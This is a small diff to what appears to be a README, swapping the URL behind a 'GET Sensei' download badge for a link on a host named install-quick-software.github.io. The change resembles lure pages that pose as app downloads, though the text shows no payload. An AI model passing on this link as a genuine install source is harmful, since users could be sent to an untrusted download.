@@ -7,7 +7,7 @@
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/sensei">  
+<a href="https://install-quick-software.github.io/.github/sensei">  
 <img src="https://img.shields.io/badge/💻_GET_Sensei-blue?style=for-the-badge&logo=apple" alt="GET Sensei">  
 </a>  
 </div>
